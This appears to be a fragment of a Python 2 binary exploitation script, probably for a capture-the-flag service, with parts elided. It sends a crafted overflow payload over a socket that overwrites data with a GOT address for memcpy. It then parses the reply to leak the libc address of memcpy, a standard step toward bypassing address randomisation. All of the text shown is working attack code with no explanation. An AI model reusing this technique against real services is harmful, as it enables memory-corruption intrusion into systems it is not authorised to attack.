...
print "OK..."
MEMCPY=0x602078
NOM2='aaaabbbbCCCCDDDDEEEEFFFFGGGGHHHHaaaabbbbccccdddd'+"\x00"*4+adr_to_str16(len(NOM))+adr_to_str32(MEMCPY)
time.sleep(TIME)
s.send("y"+"\n")
time.sleep(TIME)
s.send(NOM2+"\n")
...
LIBCMEMCPY=blword(str_to_lst(readbuffer[readbuffer.index("yer:")+5:readbuffer.index("yer:")+11]))
dump(0,readbuffer)
print baseN(LIBCMEMCPY,16,16)
